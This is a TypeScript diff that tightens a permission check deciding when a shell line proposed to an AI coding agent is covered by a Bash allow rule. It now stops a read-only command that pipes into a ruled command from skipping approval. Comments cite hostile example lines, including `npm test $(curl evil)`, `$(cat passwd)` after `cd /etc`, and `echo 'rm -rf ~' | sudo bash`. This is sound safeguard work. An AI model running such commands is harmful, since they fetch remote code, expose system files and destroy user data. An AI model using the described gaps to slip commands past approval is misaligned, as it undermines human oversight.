@@ -408,7 +408,10 @@ export function isShellTool(toolName: string): boolean {
  * <<'EOF' … EOF)"` but not `npm test $(curl evil)`. A top-level command
  * the same check proves read-only by itself needs no rule either
  * (`Bash(gh api *)` covers `gh api x --jq y | head`), provided a rule covers
- * at least one other command; the rule returned is that one. The read-only shortcut
+ * at least one other command and no command a rule covers reads its output
+ * later in the pipeline (`echo code | sqlite3 app.db` still needs a rule for
+ * `echo`); the rule
+ * returned is that one. The read-only shortcut
  * is off when the line moves directory first (`cd /etc && git commit -m
  * "$(cat passwd)"`), since the check resolves paths from the working
  * directory. An unparseable line, or one with a construct the pre-gate does
@@ -459,13 +462,20 @@ export function findBashAllowRule(
 	const first = segmentRules.find((rule) => rule !== undefined);
 	if (!first) return undefined;
 	const topLevelMoves = topLevel.some(movesDirectory);
+	// The pipeline members that run a rule's command, and, for each member,
+	// the members after it in its pipeline.
+	const ruled = new Set(topLevel.flatMap((seg, index) => (segmentRules[index] ? seg.scopes : [])));
+	const later = new Map(parsed.pipelines.flatMap((members) => members.map((scope, i) => [scope, members.slice(i + 1)] as const)));
+	const feedsRule = (seg: { scopes: number[] }) => seg.scopes.some((scope) => later.get(scope)?.some((reader) => ruled.has(reader)));
 	for (const [index, seg] of topLevel.entries()) {
 		if (segmentRules[index]) continue;
 		// A command the pre-gate proves read-only by itself needs no rule of its
 		// own (`gh api … | head`), as Claude Code allows a read-only subcommand
 		// on its own. Off after a `cd` on the line, whose later relative paths
-		// the proof would resolve from the wrong directory.
-		if (!topLevelMoves && opts.readOnly?.(seg.raw)) continue;
+		// the proof would resolve from the wrong directory, and for a command
+		// whose output a rule's command reads later in the pipeline: that
+		// command may run it (`echo 'rm -rf ~' | sudo bash` under `Bash(sudo bash)`).
+		if (!topLevelMoves && !feedsRule(seg) && opts.readOnly?.(seg.raw)) continue;
 		return undefined;
 	}
 	for (const [index, text] of parsed.substitutions.entries()) {
